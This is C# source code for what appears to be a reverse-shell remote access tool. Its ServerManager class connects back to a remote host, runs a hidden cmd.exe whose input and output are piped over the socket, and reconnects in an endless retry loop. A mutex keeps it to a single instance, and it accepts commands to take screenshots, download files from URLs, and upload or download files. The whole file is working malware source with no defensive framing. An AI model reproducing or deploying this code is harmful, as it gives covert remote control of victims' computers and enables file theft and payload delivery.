using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ReverseShellServer
{
    public class ServerManager
    {
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        BinaryWriter binaryWriter;
        BinaryReader binaryReader;
        Process processCmd;
        StringBuilder strInput;

        ServerTools tools;


        public ServerManager()
        {
            // Only one instance can run, random string identifier
            var mutex = new Mutex(false, "ThisIsMyMutex-2JUY34DE8E23D9");
            if (!mutex.WaitOne(TimeSpan.Zero, true))
            {
                Environment.Exit(0);
            }
        }


        public void Start(string remoteAdress, int remotePort, int retryDelay)
        {
            while (true)
            {
                RunServer(remoteAdress, remotePort);
                Thread.Sleep(retryDelay);           //Wait for a time and try again
            }
        }


        void RunServer(string remoteAdress, int remotePort)
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();
            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect(remoteAdress, remotePort);

                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                    binaryWriter = new BinaryWriter(networkStream);
                    binaryReader = new BinaryReader(networkStream);
                }
                catch (Exception) { return; } // if no Client, don't continue 

                tools = new ServerTools(binaryWriter, binaryReader, streamWriter);

                processCmd = new Process
                {
                    StartInfo =
                    {
                        FileName = "cmd.exe",
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardInput = true,
                        RedirectStandardError = true
                    }
                };
                processCmd.OutputDataReceived += CmdOutputDataHandler;
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }


            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    ProcessCommand();
                    strInput.Clear();
                }
                catch (Exception)
                {
                    Cleanup();
                    break;
                }
            }
        }


        void ProcessCommand()
        {
            var command = strInput.ToString().Split(' ');
            var bypassHello = false;

            if (command[0] == "terminate")
            {
                StopServer();
            }
            else if (command[0] == "exit")
            {
                throw new ArgumentException();
            }
            else if (command[0] == "#screenshot")
            {
                tools.TakeAndSendScreenShotToClient();
            }
            else if (command[0] == "#downloadurl")
            {
                tools.DownloadFileFromUrl(command[1]);
            }
            else if (command[0] == "#download")
            {
                tools.UploadFileToClient(command[1]);
            }
            else if (command[0] == "#upload")
            {
                tools.ReceiveFileFromClient(command[1]);
            }
            else if (command[0] == "#fileexist")
            {
                tools.CheckFileExist(command[1]);
                bypassHello = true;
            }
            else
            {
                strInput.Append("\n");
                processCmd.StandardInput.WriteLine(strInput);

                bypassHello = true;
            }

            if (!bypassHello)
            {
                SayHelloToCmd();
            }
        }


        void SayHelloToCmd()
        {
            strInput.Clear();
            strInput.Append("Hello !\n");
            processCmd.StandardInput.WriteLine(strInput);
        }


        void Cleanup()
        {
            try { processCmd.Kill(); }
            catch (Exception)
            {
                // ignored
            }

            streamReader.Close();
            streamWriter.Close();
            binaryReader.Close();
            binaryWriter.Close();
            networkStream.Close();
        }


        void StopServer()
        {
            Cleanup();
            Environment.Exit(Environment.ExitCode);
        }


        /// <summary>
        /// Send output to client
        /// </summary>
        /// <param name="sendingProcess"></param>
        /// <param name="outLine"></param>
        void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            var strOutput = new StringBuilder();
            if (!string.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    // Check if the line is the one representing the path and the command in the cmd, ignore it
                    if (outLine.Data.Substring(1, 2) == ":\\" && outLine.Data[outLine.Data.Length - 1] != '>') { return; }
                    
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception)
                {
                    // ignored
                }
            }
        }
    }
}
